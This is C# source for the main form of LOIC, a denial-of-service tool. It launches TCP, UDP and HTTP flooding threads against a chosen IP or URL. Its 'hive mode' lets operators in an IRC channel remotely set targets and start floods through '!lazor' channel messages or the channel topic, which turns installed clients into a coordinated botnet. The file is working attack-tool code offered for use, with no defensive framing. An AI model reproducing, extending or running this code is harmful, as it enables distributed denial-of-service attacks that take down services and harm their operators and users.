/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Meebey.SmartIrc4net;

namespace LOIC
{
	public partial class frmMain : Form
	{
		const string AttackText = "IMMA CHARGIN MAH LAZER";
		const string StpFldText = "Stop flooding";

		private IFlooder[] arr;
		private string sHost, sIP, sMethod, sData, sSubsite;
		private int iPort, iThreads, iDelay, iTimeout;
		private Protocol protocol;
		private bool intShowStats;
		private IrcClient irc;
		private Thread irclisten;
		private string channel;
		private bool ircenabled;
		private Dictionary<string, string> OpList;
		private delegate void CheckParamsDelegate(List<string> pars);

		/// <summary>
		/// Initializes a new instance of the <see cref="LOIC.frmMain"/> class.
		/// </summary>
		/// <param name="hive">Whether to enter hive mode.</param>
		/// <param name="hide">Whether to hide the form.</param>
		/// <param name="ircserver">The irc server.</param>
		/// <param name="ircport">The irc port.</param>
		/// <param name="ircchannel">The irc channel.</param>
		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
		{
			InitializeComponent();

			if(hide)
			{
				this.WindowState = FormWindowState.Minimized;
				this.ShowInTaskbar = false;
			}
			else if(!Settings.HasAcceptedEula())
			{
				// Display EULA
				using(Form f = new frmEULA())
				{
					if(f.ShowDialog(this) != DialogResult.OK) {
						// Bail out if declined
						Environment.Exit(0);
						return;
					} else {
						// Save EULA acceptance
						Settings.SaveAcceptedEula();
					}
				}
			}

			// IRC
			if(ircserver.Length > 0)
				txtIRCserver.Text = ircserver;
			if(ircport.Length > 0)
				txtIRCport.Text = ircport;
			if(ircchannel.Length > 0)
				txtIRCchannel.Text = ircchannel;

			enableHive.Checked |= hive;
			disableHive.Checked |= !hive;
		}

		/// <summary>
		/// Attack the specified target
		/// </summary>
		/// <param name="toggle">Whether to toggle.</param>
		/// <param name="on">Whether the attack should start.</param>
		/// <param name="silent">Whether to silence error output.</param>
		private void Attack(bool toggle, bool on, bool silent = false)
		{
			if((cmdAttack.Text == AttackText && toggle) || (!toggle && on))
			{
				// Protect against race condition
				if(tShowStats.Enabled) tShowStats.Stop();

				if (!int.TryParse (txtPort.Text, out iPort) || iPort < 0 || iPort > 65535) {
					Wtf ("I don't think ports are supposed to be written like THAT.", silent);
					return;
				}

				if (!int.TryParse (txtThreads.Text, out iThreads) || iThreads < 1 || iThreads > 99) {
					Wtf ("What on earth made you put THAT in the threads field?", silent);
					return;
				}

				if (String.IsNullOrEmpty(sIP) || String.IsNullOrEmpty(sHost)) {
					Wtf ("Select a target.", silent);
					return;
				}

				sMethod = cbMethod.Text;
				protocol = Protocol.None;
				try {
					protocol = (Protocol) Enum.Parse (typeof (Protocol), sMethod, true);
					// Analysis disable once EmptyGeneralCatchClause
				} catch { }
				if(protocol == Protocol.None) {
					Wtf ("Select a proper attack method.", silent);
					return;
				}

				sData = txtData.Text.Replace(@"\r", "\r").Replace(@"\n", "\n");
				if(String.IsNullOrEmpty(sData) && (protocol == Protocol.TCP || protocol == Protocol.UDP)) {
					Wtf ("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O", silent);
					return;
				}

				sSubsite = txtSubsite.Text;
				if (!sSubsite.StartsWith ("/") && (protocol == Protocol.HTTP)) {
					Wtf ("You have to enter a subsite (for example \"/\")", silent);
					return;
				}

				if (!int.TryParse (txtTimeout.Text, out iTimeout) || iTimeout < 1) {
					Wtf ("What's up with something like that in the timeout box? =S", silent);
					return;
				}

				cmdAttack.Text = StpFldText;

				if(protocol == Protocol.TCP || protocol == Protocol.UDP)
				{
					arr = new XXPFlooder[iThreads];
					for (int a = 0; a < arr.Length; a++)
					{
						arr[a] = new XXPFlooder(sIP, iPort, (int) protocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
						arr[a].Start();
					}
				}
				if(protocol == Protocol.HTTP)
				{
					arr = new HTTPFlooder[iThreads];
					for (int a = 0; a < arr.Length; a++)
					{
						arr[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
						arr[a].Start();
					}
				}
				tShowStats.Start();

                if (protocol == Protocol.SlowLoris)
                {
                    //add slowLoris Code in here
                }
			}
			else if(toggle || !on)
			{
				cmdAttack.Text = AttackText;
				if(arr != null)
				{
					foreach (IFlooder i in arr)
					{
						i.Stop();
					}
				}
			}
		}

		/// <summary>
		/// What the fuck?
		/// </summary>
		/// <param name="message">Message.</param>
		/// <param name="silent">If set to <c>true</c> silent.</param>
		private void Wtf(string message, bool silent = false)
		{
			if (silent) {
				return;
			}

			new frmWtf().Show();
			MessageBox.Show(message, "What the shit.");
		}

		/// <summary>
		/// Lock on IP target.
		/// </summary>
		/// <param name="silent">Silent?</param>
		private void LockOnIP(bool silent = false)
		{
			try
			{
				string tIP = txtTargetIP.Text.Trim().ToLowerInvariant();
				if(tIP.Length == 0)
				{
					Wtf ("I think you forgot the IP.", silent);
					return;
				}
				try
				{
					txtTarget.Text = sHost = sIP = IPAddress.Parse(tIP).ToString();
					if(sHost.Contains(":"))
					{
						sHost = "[" + sHost.Trim('[', ']') + "]";
					}
				}
				catch(FormatException)
				{
					Wtf ("I don't think an IP is supposed to be written like THAT.", silent);
					return;
				}
			}
			catch(Exception ex)
			{
				Wtf (ex.Message, silent);
				return;
			}
		}

		/// <summary>
		/// Lock on URL target.
		/// </summary>
		/// <param name="silent">Silent?</param>
		private void LockOnURL(bool silent = false)
		{
			try
			{
				string tURL = txtTargetURL.Text.Trim().ToLowerInvariant();
				if(tURL.Length == 0)
				{
					Wtf ("A URL is fine too...", silent);
					return;
				}
				try
				{
					if(!tURL.Contains("://"))
					{
						tURL = String.Concat("http://", tURL);
					}
					tURL = new Uri(tURL).Host;
					txtTarget.Text = sIP = (Functions.RandomElement(Dns.GetHostEntry(tURL).AddressList) as IPAddress).ToString();
					sHost = tURL;
				}
				catch(UriFormatException)
				{
					Wtf ("I don't think a URL is supposed to be written like THAT.", silent);
					return;
				}
				catch(SocketException)
				{
					Wtf ("The URL you entered does not resolve to an IP!", silent);
					return;
				}
			}
			catch(Exception ex)
			{
				Wtf (ex.Message, silent);
				return;
			}
		}

		/// <summary>
		/// Hive stuffs
		/// </summary>
		/// <param name="enabled">If set to <c>true</c> enabled.</param>
		private void DoHive(bool enabled)
		{
			try
			{
				// Is everything ok?
				if((txtIRCserver.Text == "" || txtIRCchannel.Text == "") && enabled)
				{
					disableHive.Checked = true;
				}
				else if(enabled)
				{
					try { IPHostEntry ipHost = Dns.GetHostEntry(txtIRCserver.Text); }
					catch { disableHive.Checked = true; }
				}
				if(disableHive.Checked && enabled)
				{
					Wtf ("Did you fill IRC options correctly?");
					return;
				}

				// We are starting connection. Disable input in IRC boxes.
				txtIRCserver.Enabled = !enabled;
				txtIRCport.Enabled = !enabled;
				txtIRCchannel.Enabled = !enabled;

				// Lets try this!
				ircenabled = enabled;
				if(enabled)
				{
					SetStatus("Connecting..");
					if (irc == null) {
						irc = new IrcClient();
						irc.OnConnected += IrcConnected;
						irc.OnReadLine += OnReadLine;
						irc.OnChannelMessage += OnMessage;
						irc.OnOp += OnOp;
						irc.OnDeop += OnDeOp;
						irc.OnPart += OnPart;
						irc.OnNickChange += OnNickChange;
						irc.OnTopic += OnTopic;
						irc.OnTopicChange += OnTopicChange;
						irc.OnQuit += OnQuit;
						irc.OnKick += OnKick;
						irc.OnDisconnected += IrcDisconnected;
						irc.OnNames += OnNames;
						irc.AutoRejoinOnKick = true;
						irc.AutoRejoin = true;
					}
					try
					{
						int port;
						if(!int.TryParse(txtIRCport.Text, out port)) port = 6667;
						irc.Connect(txtIRCserver.Text, port);
						channel = txtIRCchannel.Text.ToLowerInvariant();

						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");

						// Spawn a thread to handle the listen.
						irclisten = new Thread(IrcListenThread);
						irclisten.Start();
					}
					// Analysis disable once EmptyGeneralCatchClause
					catch
					{ }
				}
				else
				{
					try
					{
						if(irc != null) irc.Disconnect();
					}
					// Analysis disable once EmptyGeneralCatchClause
					catch
					{ }
					SetStatus("Disconnected.");
				}
			}
			catch
			{ }
		}

		/// <summary>
		/// IRC listening thread.
		/// </summary>
		private void IrcListenThread()
		{
			while (ircenabled)
			{
				irc.Listen();
			}
		}

		/// <summary>
		/// Handles the IRC OnDisconnected event.
		/// </summary>
		/// <param name="o">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void IrcDisconnected(object o, EventArgs e)
		{
			if(ircenabled)
			{
				try
				{
					int port;
					if(!int.TryParse(txtIRCport.Text, out port)) port = 6667;
					irc.Connect(txtIRCserver.Text, port);
					irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
				}
				catch
				{ }
			}
		}

		/// <summary>
		/// Handles the IRC OnConnected event.
		/// </summary>
		/// <param name="o">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void IrcConnected(object o, EventArgs e)
		{
			SetStatus("Logging In...");
		}
		private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);

		/// <summary>
		/// Handles the IRC OnNames event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnNames(object sender, NamesEventArgs e)
		{
			SetStatus("Connected!");
			if(OpList != null)
			{
				OpList.Clear();
			}
			else
			{
				if(OpList == null) OpList = new Dictionary<string, string>();
			}

			foreach (string user in e.UserList)
			{
				if(user.StartsWith("@") || user.StartsWith("&") || user.StartsWith("~"))
				{

					OpList.Add(user.Substring(1), "");
				}
			}
		}

		/// <summary>
		/// Handles the IRC OnOp event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnOp(object sender, OpEventArgs e)
		{
			if(OpList == null) OpList = new Dictionary<string, string>();
			if(!OpList.ContainsKey(e.Whom))
			{
				OpList.Add(e.Whom, "");
			}
		}

		/// <summary>
		/// Handles the IRC OnDeOp event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnDeOp(object sender, DeopEventArgs e)
		{
			if(OpList == null) OpList = new Dictionary<string, string>();
			if(OpList.ContainsKey(e.Whom))
			{
				OpList.Remove(e.Whom);
			}
		}

		/// <summary>
		/// Handles the IRC OnPart event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnPart(object sender, PartEventArgs e)
		{
			if(OpList == null) OpList = new Dictionary<string, string>();
			if(OpList.ContainsKey( e.Who))
			{
				OpList.Remove(e.Who);
			}
		}

		/// <summary>
		/// Handles the IRC OnQuit event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnQuit(object sender, QuitEventArgs e)
		{
			if(OpList == null) OpList = new Dictionary<string, string>();
			if(OpList.ContainsKey(e.Who))
			{
				OpList.Remove(e.Who);
			}
		}

		/// <summary>
		/// Handles the IRC OnTopic event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnTopic(object sender, TopicEventArgs e)
		{
			if(e.Channel.ToLowerInvariant() == channel && e.Topic.StartsWith("!lazor "))
			{
				List<string> pars = new List<string>(e.Topic.Split(' '));
				SetStatus("Controlled by topic");
				try
				{
					txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
				}
				catch
				{ }
			}
		}

		/// <summary>
		/// Handles the IRC OnTopicChange event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnTopicChange(object sender, TopicChangeEventArgs e)
		{
			if(e.Channel.ToLowerInvariant() == channel && e.NewTopic.StartsWith("!lazor "))
			{
				List<string> pars = new List<string>(e.NewTopic.Split(' '));
				SetStatus("Controlled by topic");
				try
				{
					txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
				}
				catch
				{ }
			}
		}

		/// <summary>
		/// Handles the IRC OnNickChange event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnNickChange(object sender, NickChangeEventArgs e)
		{
			if(OpList.ContainsKey(e.OldNickname))
			{
				OpList.Remove(e.OldNickname);

				if(!OpList.ContainsKey(e.NewNickname))
				{
					OpList.Add(e.NewNickname, "");
				}
			}
		}

		/// <summary>
		/// Handles the IRC OnKick event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnKick(object sender, KickEventArgs e)
		{
			if(OpList == null) OpList = new Dictionary<string, string>();
			if(OpList.ContainsKey(e.Whom))
			{
				OpList.Remove(e.Whom);
			}
		}
		private delegate void SetStatusDelegate(string status);

		/// <summary>
		/// Sets the status.
		/// </summary>
		/// <param name="status">Status.</param>
		void SetStatus(string status)
		{
			if(label25.InvokeRequired)
			{
				label25.Invoke(new SetStatusDelegate(SetStatus), status);
			}
			else
			{
				label25.Text = status;
			}
		}

		/// <summary>
		/// Handles the IRC OnMessage event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnMessage(object sender, IrcEventArgs e)
		{
			if(e.Data.Channel.ToLowerInvariant() == channel)
			{
				if(e.Data.Message.StartsWith("!lazor "))
				{
					//authenticate
					if(OpList != null && OpList.ContainsKey(e.Data.Nick))
					{
						List<string> pars = new List<string>(e.Data.Message.Split(' '));
						SetStatus("Controlled by "+e.Data.Nick);
						try
						{
							txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
						}
						catch
						{ }
					}
				}
			}
		}

		/// <summary>
		/// Checks the parameters.
		/// </summary>
		/// <param name="pars">Pars.</param>
		void CheckParams(List<string> pars)
		{
			Attack(false, false, true);

			foreach (string param in pars)
			{
				string[] sp = param.Split(new char[]{'='}, 2, StringSplitOptions.RemoveEmptyEntries);
				if (sp.Length == 2)
				{
					string cmd = sp[0];
					string value = sp[1];

					int num;
					switch (cmd.ToLowerInvariant())
					{
						case "targetip":
							txtTargetIP.Text = value;
							LockOnIP(true);
							break;
						case "targethost":
							txtTargetURL.Text = value;
							LockOnURL(true);
							break;
						case "timeout":
							if(int.TryParse(value, out num) && num >= 1)
								txtTimeout.Text = num.ToString();
							break;
						case "subsite":
							txtSubsite.Text = value;
							break;
						case "message":
							txtData.Text = value;
							break;
						case "port":
							if(int.TryParse(value, out num) && num >= 0 && num <= 65535)
								txtPort.Text = num.ToString();
							break;
						case "method":
							int index = cbMethod.FindString(value);
							if(index != -1)
								cbMethod.SelectedIndex = index;
							break;
						case "threads":
							if(int.TryParse(value, out num) && num >= 1 && num <= 99)
								txtThreads.Text = num.ToString();
							break;
						case "wait":
							if(value.ToLowerInvariant() == "true")
								chkWaitReply.Checked = true;
							else if(value.ToLowerInvariant() == "false")
								chkWaitReply.Checked = false;
							break;
						case "random":
							if(value.ToLowerInvariant() == "true")
								chkAllowRandom.Checked = true;
							else if(value.ToLowerInvariant() == "false")
								chkAllowRandom.Checked = false;
							break;
						case "gzip":
						case "usegzip":
							if(value.ToLowerInvariant() == "true")
								chkAllowGzip.Checked = true;
							else if(value.ToLowerInvariant() == "false")
								chkAllowGzip.Checked = false;
							break;
						case "speed":
							if(int.TryParse(value, out num) && num >= tbSpeed.Minimum && num <= tbSpeed.Maximum)
								tbSpeed.Value = num;
							break;
					}
				}
				else
				{
					if(sp[0].ToLowerInvariant() == "start")
					{
						Attack(false, true, true);
						return;
					}
					else if(sp[0].ToLowerInvariant() == "default")
					{
						txtTargetIP.Text = "";
						txtTargetURL.Text ="";
						txtTimeout.Text = "9001";
						txtSubsite.Text = "/";
						txtData.Text = "U dun goofed";
						txtPort.Text = "80";
						int index = cbMethod.FindString("TCP");
						if(index != -1) { cbMethod.SelectedIndex = index; }
						txtThreads.Text = "10";
						chkWaitReply.Checked = true;
						chkAllowRandom.Checked = false;
						chkAllowGzip.Checked = true;
						tbSpeed.Value = 0;
					}
				}
			}
			SetStatus("Waiting.");
		}

		/// <summary>
		/// Handles the IRC OnReadLine event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		void OnReadLine(object sender, ReadLineEventArgs e)
		{
			string command = e.Line.Split(' ')[1];
			if( command.Equals("PING") )
			{
				string server = e.Line.Split(' ')[2];
				irc.WriteLine("PONG " + server, Priority.Critical);
			}
			else if( command.Equals("422") || command.Equals("376") ) // 422: motd missing // 376: end of motd
			{
				if(OpList != null) OpList.Clear();
				irc.RfcJoin(channel);
			}
		}

		/// <summary>
		/// Handles the Form Load event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void frmMain_Load(object sender, EventArgs e)
		{
			this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
		}

		/// <summary>
		/// Handles the Form Closed event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void frmMain_Closed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ircenabled = false;
				if(irclisten != null) irclisten.Abort();
				if(irc != null) irc.Disconnect();
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch
			{ }
			finally
			{
				Environment.Exit(0);
			}
		}

		/// <summary>
		/// Handles the cmdTargetURL Click event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			LockOnURL(false);
		}

		/// <summary>
		/// Handles the cmdTargetIP Click event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
			LockOnIP(false);
		}

		/// <summary>
		/// Handles the txtTarget Enter event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void txtTarget_Enter(object sender, EventArgs e)
		{
			cmdAttack.Focus();
		}

		/// <summary>
		/// Handles the cmdAttack Click event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void cmdAttack_Click(object sender, EventArgs e)
		{
			Attack(true, false, false);
		}

		/// <summary>
		/// Handles the tShowStats Tick event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void tShowStats_Tick(object sender, EventArgs e)
		{
			// Protect against null reference and race condition
			if(arr == null || intShowStats)
				return;

			intShowStats = true;

			int iIdle = 0;
			int iConnecting = 0, iRequesting = 0, iDownloading = 0;
			int iDownloaded = 0, iRequested = 0, iFailed = 0;

			foreach (cHLDos c in arr)
			{
				iDownloaded += c.Downloaded;
				iRequested += c.Requested;
				iFailed += c.Failed;
				if(c.State == ReqState.Ready ||
					c.State == ReqState.Completed)
					iIdle++;
				if(c.State == ReqState.Connecting)
					iConnecting++;
				if(c.State == ReqState.Requesting)
					iRequesting++;
				if(c.State == ReqState.Downloading)
					iDownloading++;
			}
			lbFailed.Text = iFailed.ToString();
			lbRequested.Text = iRequested.ToString();
			lbDownloaded.Text = iDownloaded.ToString();
			lbDownloading.Text = iDownloading.ToString();
			lbRequesting.Text = iRequesting.ToString();
			lbConnecting.Text = iConnecting.ToString();
			lbIdle.Text = iIdle.ToString();

			intShowStats = false;
		}

		/// <summary>
		/// Handles the tbSpeed ValueChanged event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if(arr != null)
			{
				foreach (IFlooder i in arr)
				{
					if(i != null) i.Delay = iDelay;
				}
			}
		}

		/// <summary>
		/// Handles the enableHive CheckedChanged event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void enableHive_CheckedChanged(object sender, EventArgs e)
		{
			if(enableHive.Checked)
			{
				DoHive(true);
			}
		}

		/// <summary>
		/// Handles the disableHive CheckedChanged event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void disableHive_CheckedChanged(object sender, EventArgs e)
		{
			if(disableHive.Checked)
			{
				DoHive(false);
			}
		}

		/// <summary>
		/// Handles the label24 Click event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void label24_Click(object sender, EventArgs e)
		{
			Process.Start("https://github.com/NewEraCracker/LOIC");
		}

        private void cbMethod_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void txtTarget_TextChanged(object sender, EventArgs e)
        {

        }

        private void pBanner_Click(object sender, EventArgs e)
        {
            
        }
	}
}